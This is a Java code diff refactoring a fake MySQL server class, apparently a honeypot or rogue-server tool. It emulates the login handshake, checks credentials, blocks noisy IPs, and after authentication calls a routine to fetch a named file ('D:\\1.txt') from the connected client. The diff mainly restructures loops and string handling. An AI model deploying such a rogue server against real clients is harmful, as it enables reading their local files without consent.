@@ -93,63 +93,65 @@ public class Socket extends Thread {
 
     // 欺骗mysql命令行登录
     public void deceptionMysqlCMD() throws IOException {
-        configuration.getInstanceThreadId();
+        configuration.getInstance();
         while (true) {
             java.net.Socket server = null;
             String ip;
-            try {
-                server = serverSocket.accept();
-                assert server != null;
-                ip = server.getRemoteSocketAddress().toString().substring(1);
-                ip = ip.substring(0, ip.lastIndexOf(":"));
-                logger.info("[+] 已连接的客户端: " + server.getRemoteSocketAddress());
-                DataInputStream in = new DataInputStream(server.getInputStream());
-                DataOutputStream out = new DataOutputStream(server.getOutputStream());
+            while (true) {
+                try {
+                    server = serverSocket.accept();
+                    assert server != null;
+                    ip = server.getRemoteSocketAddress().toString().substring(1);
+                    ip = ip.substring(0, ip.lastIndexOf(":"));
+                    logger.info("[+] 已连接的客户端: " + server.getRemoteSocketAddress());// todo 替换为保存进日志文件中
+                    DataInputStream in = new DataInputStream(server.getInputStream());
+                    DataOutputStream out = new DataOutputStream(server.getOutputStream());
 
-                // 如果客户端连接上了,则查看客户端的ip是否超过阈值,超过则返回1129错误码,并结束socket
-                if (ip != null && isBlockIp(ip)) {
-                    configuration.return1129(out, ip);
-                    break;
-                }
-
-                long startTime = System.currentTimeMillis();
-                out.write(stringUtils.hexToByteArray(configuration.flushVersionText())); // 发送mysql版本信息
-                out.flush();
-                long endTime = System.currentTimeMillis();
-                long elapsedTime = endTime - startTime;
-                // 如果发生超时异常，则认为延迟不稳定，断开连接.并记录ip进blockList.txt,然后查看是否超过max_connect_errors,如果超过了则发送ERROR 1129给客户端
-                if (elapsedTime > 20000) {
-                    recordIp(ip);
+                    // 如果客户端连接上了,则查看客户端的ip是否超过阈值,超过则返回1129错误码,并结束socket
                     if (isBlockIp(ip)) {
-                        out = new DataOutputStream(server.getOutputStream());
                         configuration.return1129(out, ip);
+                        break;
                     }
-                    server.close();
+
+                    long startTime = System.currentTimeMillis();
+                    out.write(stringUtils.hexToByteArray(configuration.flushVersionText())); // 发送mysql版本信息
+                    out.flush();
+                    long endTime = System.currentTimeMillis();
+                    long elapsedTime = endTime - startTime;
+                    // 如果发生超时异常，则认为延迟不稳定，断开连接.并记录ip进blockList.txt,然后查看是否超过max_connect_errors,如果超过了则发送ERROR 1129给客户端
+                    if (elapsedTime > 20000) {
+                        recordIp(ip);
+                        if (isBlockIp(ip)) {
+                            out = new DataOutputStream(server.getOutputStream());
+                            configuration.return1129(out, ip);
+                        }
+                        server.close();
+                        break;
+                    }
+                    byte[] bys = new byte[1024];
+                    in.read(bys);       // 接受客户端发来的验证信息(如账号密码)
+
+                    // 处理客户端发来的数据包,提取出salt和password,salt结合自己预设的密码 =>变为最终的ServerPassword,password和ServerPassword相等时即验证成功.加入登录验证,正确时继续,否则返回错误
+                    if (!handlePassword(bys)) {
+                        configuration.return1045(out, ip);
+                        break;
+                    }
+
+                    out.write(configuration.verificationText);  // res ok
+                    out.flush();
+                    bys = new byte[1024];
+                    in.read(bys);
+
+                    String filename = "D:\\1.txt";
+                    getData(filename, server);
+
+                } catch (Exception e) {
+                    e.printStackTrace();
                     break;
-                }
-                byte[] bys = new byte[1024];
-                in.read(bys);       // 接受客户端发来的验证信息(如账号密码)
-
-                // 处理客户端发来的数据包,提取出salt和password,salt结合自己预设的密码 =>变为最终的ServerPassword,password和ServerPassword相等时即验证成功.加入登录验证,正确时继续,否则返回错误
-                if (!handlePassword(bys)) {
-                    configuration.return1045(out, ip);
-                    break;
-                }
-
-                out.write(configuration.verificationText);  // res ok
-                out.flush();
-                bys = new byte[1024];
-                in.read(bys);
-
-                String filename = "D:\\1.txt";
-                getData(filename, server);
-
-            } catch (Exception e) {
-                e.printStackTrace();
-                break;
-            } finally {
-                if (server != null) {
-                    server.close();
+                } finally {
+                    if (server != null) {
+                        server.close();
+                    }
                 }
             }
         }
@@ -212,14 +214,14 @@ public class Socket extends Thread {
         // 2.验证username是否存在,不存在直接不给客户端连接(使用fileUtils实现)
         List<String> lines = FileUtils.readLines(configuration.correctUserInfo);
         String[] usernameAndPassword, passwordList = new String[lines.size()];
-        String username = new String();
+        StringBuilder username = new StringBuilder(new String());
         for (i = 0; i < usernameByChar.length; i++) {
-            username = username + usernameByChar[i];
+            username.append(usernameByChar[i]);
         }
         int flag = 0, counter = 0;   // 标记客户端发来的用户名是否存在,存在则flag = 1;
         for (String line : lines) {
             usernameAndPassword = stringUtils.splitBySymbol(line, " ");
-            if (Objects.equals(username, usernameAndPassword[0])) {
+            if (Objects.equals(username.toString(), usernameAndPassword[0])) {
                 flag = 1;
                 break;
             }
@@ -234,9 +236,7 @@ public class Socket extends Thread {
             isHavePassword = false; // 我这里为了省事,直接设置没有无密码登录
             flag = 0;
         } else {
-            for (i = 0; i < passwordLength; i++) {
-                clientPassword[i] = bys[usernameLength + 36 + 2 + i];
-            }
+            for (i = 0; i < passwordLength; i++) clientPassword[i] = bys[usernameLength + 36 + 2 + i];
             // 4.获取correctUserInfo.txt中的password
             for (String line : lines) {
                 usernameAndPassword = stringUtils.splitBySymbol(line, " ");
